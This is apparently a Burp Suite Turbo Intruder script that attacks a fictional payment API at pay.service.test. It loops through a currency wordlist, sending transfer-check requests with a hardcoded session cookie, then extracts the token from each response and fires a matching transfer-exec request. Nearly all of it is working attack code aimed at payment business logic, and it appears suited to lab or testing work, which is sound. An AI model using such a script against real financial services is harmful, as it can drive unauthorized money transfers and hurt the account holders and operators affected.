import re

session = "123123-123123"

http_method = "POST "
http_uri_transfer_check = "/api/transfer/check"
http_uri_transfer_exec = "/api/transfer/exec"
http_version = " HTTP/1.1\r\n"

header_host = "Host: pay.service.test\r\n"
header_user_agent = "User-Agent: Mozilla/5.0 Gecko/20100101 Firefox/67.0\r\n"
header_content_type = "Content-Type: application/x-www-form-urlencoded\r\n"
header_accept = "Accept: application/x-www-form-urlencoded\r\n"
header_cookie = "Cookie: PHPSESSIONID=" + session + "\r\n"
header_connection = "Connection: close\r\n"

request_body = "amount=100&source=1234&target=1235"

re_token = '"token":"(.*?)","data"'
re_currency = 'currency=(.*?)$'


def queueRequests(target, request):
    engine = RequestEngine(endpoint=target.endpoint)
    engine.start()

    if not str(request).startswith("POST "):
        currency_list = open("/usr/share/currency_list.txt", "r").read().splitlines()
        for currency in currency_list:
            current_request_body = request_body + "&currency=" + currency
            engine.queue(target.req, http_method + http_uri_transfer_check + http_version +
                         header_host + header_user_agent + header_content_type + header_accept + header_cookie +
                         header_connection + "Content-Length: " + str(len(current_request_body)) + "\r\n\r\n" +
                         current_request_body)
    else:
        engine.queue(target.req, request)


def handleResponse(req, interesting):
    table.add(req)
    match_token = re.search(re_token, req.response)
    if match_token:
        token = match_token.group(1)
        currency = re.search(re_currency, req.request).group(1)
        current_request_body = request_body + "&currency=" + currency + "&token=" + token
        req.engine.queue(req.template, http_method + http_uri_transfer_exec + http_version +
                         header_host + header_user_agent + header_content_type + header_accept + header_cookie +
                         header_connection + "Content-Length: " + str(len(current_request_body)) + "\r\n\r\n" +
                         current_request_body)
